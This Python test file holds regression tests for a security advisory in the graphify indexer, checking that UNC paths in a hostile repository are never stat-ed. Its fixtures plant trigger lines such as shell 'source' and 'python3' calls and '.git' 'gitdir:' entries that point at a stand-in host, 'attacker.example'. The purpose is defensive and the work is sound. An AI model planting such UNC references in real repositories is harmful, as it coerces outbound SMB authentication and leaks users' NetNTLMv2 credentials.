r"""Regression tests for GHSA-g6c9-j4vm-mwq4.

Indexing a hostile repository must not stat a corpus-chosen UNC path. On Windows
such a stat coerces outbound SMB authentication to an attacker-named host and
leaks a NetNTLMv2 response, on default settings, with no LLM call. Three source
spellings in a `.sh` file and a `.git` file naming a UNC `gitdir:` are the
triggers.

The unit tests exercise the guard predicates directly (platform-independent).
The integration tests arm the pathlib probes (as the advisory PoC did) and assert
they never fire against a UNC path and that no edge to such a target is emitted,
while legitimate in-tree resolution still works. The `//host/share` spelling is
UNC on every platform, so the bash integration tests use it; the `\\host\share`
spelling is Windows-only at the filesystem level, so it is covered where the
guard is a pure string check (detect.py and the predicate unit tests).
"""

from __future__ import annotations

import pathlib
from pathlib import Path

import pytest

from graphify import detect as detect_mod
from graphify.extractors import bash as bash_mod
from graphify.extractors.base import set_active_scan_root

ATTACKER = "attacker.example"


def _is_unc_str(s: str) -> bool:
    return s[:2] in ("\\\\", "//")


# --- guard predicate unit tests (platform-independent) ---------------------


@pytest.mark.parametrize(
    "spelling",
    ["//attacker.example/share/x", "\\\\attacker.example\\share\\x"],
)
def test_safe_to_probe_refuses_unc(spelling):
    root = Path("/corpus").resolve()
    assert bash_mod._safe_to_probe(Path(spelling), root) is False
    # UNC is refused even with no known scan root.
    assert bash_mod._safe_to_probe(Path(spelling), None) is False


def test_safe_to_probe_refuses_absolute_outside_tree():
    root = Path("/corpus/project").resolve()
    assert bash_mod._safe_to_probe(Path("/etc/passwd"), root) is False


def test_safe_to_probe_allows_in_tree_and_relative():
    root = Path("/corpus/project").resolve()
    assert bash_mod._safe_to_probe(root / "sub" / "lib.sh", root) is True
    # Relative paths resolve against cwd lexically; a plain name is allowed when
    # no scan root bounds it (direct extractor call).
    assert bash_mod._safe_to_probe(Path("lib.sh"), None) is True


def test_resolve_safe_returns_none_for_unc(tmp_path):
    root = tmp_path.resolve()
    assert bash_mod._resolve_safe(Path("//attacker.example/share/x.sh"), root) is None


def test_resolve_safe_returns_resolved_for_in_tree(tmp_path):
    root = tmp_path.resolve()
    target = root / "lib.sh"
    target.write_text("echo hi\n", encoding="utf-8")
    assert bash_mod._resolve_safe(root / "lib.sh", root) == target.resolve()


@pytest.mark.parametrize(
    "spelling",
    ["//attacker.example/share", "\\\\attacker.example\\share"],
)
def test_is_unc_path_detects_both_spellings(spelling):
    assert detect_mod._is_unc_path(Path(spelling)) is True


def test_is_unc_path_allows_local():
    assert detect_mod._is_unc_path(Path("/home/user/.git/worktrees/x")) is False


# --- fixtures for the integration tests ------------------------------------


@pytest.fixture
def armed_probes(monkeypatch):
    """Record every pathlib existence probe that targets a UNC-shaped path.

    Does not raise (so it cannot be swallowed by an extractor's try/except); the
    test asserts the recorded list is empty. Only genuinely UNC-shaped paths
    (``//`` or ``\\`` prefixed at the OS level) are flagged — those are the ones
    that reach the network.
    """
    hits: list[tuple[str, str]] = []
    for name in ("exists", "is_file", "is_dir"):
        original = getattr(pathlib.Path, name)

        def make(orig, probe_name):
            def wrapper(self, *args, **kwargs):
                if _is_unc_str(str(self)):
                    hits.append((probe_name, str(self)))
                return orig(self, *args, **kwargs)

            return wrapper

        monkeypatch.setattr(pathlib.Path, name, make(original, name))
    return hits


@pytest.fixture
def scan_root(tmp_path):
    previous = set_active_scan_root(tmp_path.resolve())
    try:
        yield tmp_path
    finally:
        set_active_scan_root(previous)


def _unc_edges(result: dict) -> list:
    return [
        e
        for e in result.get("edges", [])
        if _is_unc_str(str(e.get("target_file", "") or ""))
        or _is_unc_str(str(e.get("target", "") or ""))
    ]


# --- bash source / invocation triggers (UNC //) ----------------------------

UNC_SOURCE_LINES = [
    pytest.param("source //attacker.example/share/x.sh", id="source-prefixed"),
    pytest.param(". //attacker.example/share/x.sh", id="dot-command"),
    pytest.param("python3 //attacker.example/share/x.py", id="interpreter-invocation"),
]


@pytest.mark.parametrize("line", UNC_SOURCE_LINES)
def test_bash_unc_source_is_never_probed(line, armed_probes, scan_root):
    script = scan_root / "build.sh"
    script.write_text(f"#!/bin/bash\n{line}\n", encoding="utf-8")

    result = bash_mod.extract_bash(script)

    assert armed_probes == [], f"UNC path was stat-ed: {armed_probes}"
    assert _unc_edges(result) == [], "an edge to the UNC target was emitted"


def test_bash_legitimate_in_tree_source_still_resolves(armed_probes, scan_root):
    """Positive control: the guard must not block a normal sibling source."""
    (scan_root / "lib.sh").write_text("echo lib\n", encoding="utf-8")
    script = scan_root / "build.sh"
    script.write_text("#!/bin/bash\nsource ./lib.sh\n", encoding="utf-8")

    result = bash_mod.extract_bash(script)

    assert armed_probes == []
    resolved_edges = [
        e for e in result.get("edges", []) if "lib.sh" in str(e.get("target_file", ""))
    ]
    assert resolved_edges, "legitimate in-tree `source ./lib.sh` was dropped"


# --- detect.py gitdir triggers (both UNC spellings: pure string check) ------


@pytest.mark.parametrize(
    "gitdir",
    ["//attacker.example/share", "\\\\attacker.example\\share"],
)
def test_git_info_exclude_refuses_unc_gitdir(gitdir, armed_probes, tmp_path):
    (tmp_path / ".git").write_text(f"gitdir: {gitdir}\n", encoding="utf-8")

    assert detect_mod._git_info_exclude(tmp_path) is None
    assert armed_probes == [], f"UNC gitdir was stat-ed: {armed_probes}"


@pytest.mark.parametrize(
    "gitdir",
    ["//attacker.example/share", "\\\\attacker.example\\share"],
)
def test_linked_worktree_main_root_refuses_unc_gitdir(gitdir, armed_probes, tmp_path):
    (tmp_path / ".git").write_text(f"gitdir: {gitdir}\n", encoding="utf-8")

    assert detect_mod._linked_worktree_main_root(tmp_path) is None
    assert armed_probes == [], f"UNC gitdir was stat-ed: {armed_probes}"


def test_git_info_exclude_still_reads_a_local_exclude(tmp_path):
    """Positive control: a normal `.git` directory's info/exclude still resolves."""
    git_dir = tmp_path / ".git"
    (git_dir / "info").mkdir(parents=True)
    exclude = git_dir / "info" / "exclude"
    exclude.write_text("*.tmp\n", encoding="utf-8")

    assert detect_mod._git_info_exclude(tmp_path) == exclude
